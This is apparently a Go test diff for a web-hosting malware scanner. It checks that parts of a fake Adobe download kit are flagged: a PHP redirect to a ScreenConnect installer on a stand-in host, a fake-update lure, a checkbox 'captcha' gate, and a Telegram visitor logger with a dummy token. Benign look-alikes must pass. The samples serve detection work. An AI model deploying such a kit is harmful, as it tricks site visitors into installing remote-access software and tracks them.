@@ -1881,3 +1881,49 @@ func TestFleetRecheckQuarantinedZip(t *testing.T) {
 		t.Fatalf("%+v %v", rep, err)
 	}
 }
+
+// server100 (2026-11-04, aloradecor.com, reported to Hetzner as a RAT): a
+// fake Adobe download kit uploaded into a WordPress site - a checkbox
+// "captcha", a visitor logger to Telegram, a page that sends the visitor to
+// another site's download.php, and that file's redirect to a ScreenConnect
+// access client. None had a finding. Inert shapes (example domains, a fake
+// bot token); look-alikes from real sites stay clean.
+func TestFleetFakeAdobeDownloadKit(t *testing.T) {
+	s := newScanner(t)
+	kit := map[string]struct{ name, sig, body string }{
+		"redirect": {"download.php", "Malware.Redirect.RemoteAccessInstaller",
+			"<?php\nheader(\"Location: https://relay.example.test/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest\", true, 301);\nexit;\n?>\n"},
+		"lure": {"index.php", "Phishing.FakeUpdate.DownloadLure",
+			"<?php session_start(); if (empty($_SESSION['captcha_verified'])) { header('Location: captcha.php'); exit(); } ?>\n<html><head><title>Adobe Acrobat Viewer Download</title>\n<meta http-equiv=\"refresh\" content=\"10; url=https://other.example.test/downloadnew.php\"></head>\n" +
+				"<body><p class=\"subtitle\">This document requires the latest version of Adobe Acrobat Viewer</p><p>The latest version will download automatically.</p></body></html>\n"},
+		"visit logger": {"visit.php", "Phishing.Collector.TelegramVisitLogger",
+			"<?php\nsession_start();\n$botToken = \"0000000000:inert-test-token\"; $chatId = \"1\";\n$ip = $_SERVER['REMOTE_ADDR'];\n$hostname = gethostbyaddr($ip);\n$info = @file_get_contents(\"http://ip-api.com/json/$ip\");\n" +
+				"$msg = \"New Visitor: $ip $hostname\";\nfile_get_contents(\"https://api.telegram.org/bot$botToken/sendMessage\", false, stream_context_create(['http' => ['method' => 'POST', 'content' => http_build_query(['chat_id' => $chatId, 'text' => $msg])]]));\nheader(\"Location: index.php\");\nexit();\n"},
+		"checkbox captcha": {"captcha.php", "Phishing.FakeCaptcha.CheckboxGate",
+			"<?php\nsession_start();\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    if (isset($_POST['captcha_checkbox']) && $_POST['captcha_checkbox'] === 'on') {\n        $_SESSION['captcha_verified'] = true;\n        header(\"Location: visit.php\");\n        exit();\n    }\n}\n?>\n" +
+				"<h2>Verify You're Human</h2><form method=\"post\"><label><input type=\"checkbox\" name=\"captcha_checkbox\"> I'm not a robot</label><button type=\"submit\">Verify</button></form>\n"},
+	}
+	for what, k := range kit {
+		p := "/home/u/public_html/a/adobelanding/" + k.name
+		if d := s.checkContent(p, extOf(p), []byte(k.body)); d == nil || d.Signature != k.sig || d.Category != CatVirus {
+			t.Errorf("%s: %+v", what, d)
+		}
+	}
+	for what, body := range map[string]string{
+		// An IT company's page linking its support client.
+		"support link": "<html><body><h1>Remote support</h1><p>Download our support client:</p><a href=\"https://help.example.test/Bin/ScreenConnect.ClientSetup.exe?e=Support&y=Guest\">Start session</a></body></html>\n",
+		// A shop's order form sent to the owner's Telegram.
+		"order to Telegram": "<?php\n$name = $_POST['name']; $phone = $_POST['phone'];\n$ip = $_SERVER['REMOTE_ADDR'];\n$geo = @file_get_contents(\"http://ip-api.com/json/$ip\");\nfile_get_contents(\"https://api.telegram.org/bot0000:inert/sendMessage?chat_id=1&text=\" . urlencode(\"$name $phone $ip\"));\nheader('Location: thanks.html');\n",
+		// A real check, and a plain download page.
+		"reCAPTCHA form": "<?php\nif (isset($_POST['g-recaptcha-response'])) { $r = file_get_contents('https://www.google.com/recaptcha/api/siteverify?secret=x&response=' . $_POST['g-recaptcha-response']); if (json_decode($r)->success) { $_SESSION['human_verified'] = true; } }\n?><form method=\"post\"><div class=\"g-recaptcha\"></div><button>Send</button></form>\n",
+		"Adobe link": "<html><body><p>To read these PDF files you need the latest version of Adobe Acrobat Reader, free from <a href=\"https://get.adobe.com/reader/\">Adobe</a>.</p></body></html>\n",
+	} {
+		p := "/home/u/public_html/page.php"
+		if strings.Contains(what, "link") {
+			p = "/home/u/public_html/page.html"
+		}
+		if d := s.checkContent(p, extOf(p), []byte(body)); d != nil {
+			t.Errorf("%s: %+v", what, d)
+		}
+	}
+}
